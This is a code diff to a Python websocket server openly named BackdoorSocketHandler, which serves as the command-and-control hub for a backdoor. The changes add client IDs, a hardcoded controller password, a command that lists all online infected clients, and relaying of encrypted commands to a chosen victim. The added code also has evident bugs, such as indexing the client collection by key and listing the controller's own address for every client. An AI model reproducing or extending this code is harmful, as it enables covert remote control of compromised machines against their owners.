@@ -9,7 +9,7 @@ from Crypto.Cipher import AES
 __author__ = 'nekocode'
 
 # config
-PASSWORD = '110110'
+PASSWORD = '110110zxc'
 
 
 class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
@@ -26,6 +26,7 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
     def __init__(self, application, request, **kwargs):
         tornado.websocket.WebSocketHandler.__init__(self, application, request, **kwargs)
         self.HOST_NAME = None
+        self.ID = None
         self.IV = '\0' * AES.block_size
         self.SECRET = None
         self.is_controller = False
@@ -43,30 +44,38 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
     def open(self):
         pass
 
-    def send_msg(self, data):
+    def send_data(self, data):
         msg = {'data': self.encrypt(data)}
         self.write_message(json.dumps(msg))
 
     def on_message(self, message):
         msg = json.loads(message)
-        if 'host_name' in msg:
+        if 'id' in msg:
+            self.ID = msg['id']
             self.HOST_NAME = msg['host_name']
             self.SECRET = b64decode(msg['secret'])
             if 'pwd' in msg:
                 if PASSWORD == self.decrypt(msg['pwd']):
                     self.is_controller = True
-                    self.send_msg('login success')
+                    self.send_data('login success')
                 else:
-                    self.send_msg('login failed')
+                    self.send_data('login failed')
                     return
 
             BackdoorSocketHandler.clients.add(self)
-            print 'find new client: ' + self.request.remote_ip + '(' + self.HOST_NAME + ')'
+            print 'find new client: ' + self.request.remote_ip + '(' + self.ID + ')'
 
-        if self.HOST_NAME:
+        if self.ID:
             if self.is_controller and 'cmd' in msg:
                 command = self.decrypt(msg['cmd'])
-                print command
+                if command == 'list':
+                    data = 'List all online backdoor-clients:\n'
+                    for client in BackdoorSocketHandler.clients:
+                        data += client.ID + '\t' + self.request.remote_ip + '\t' + self.HOST_NAME + '\n'
+                    self.send_data(data)
+                elif 'to' in msg:
+                    to_client = BackdoorSocketHandler.clients[msg['to']]
+                    to_client.write_message(message)
 
     def on_close(self):
         if self in BackdoorSocketHandler.clients:
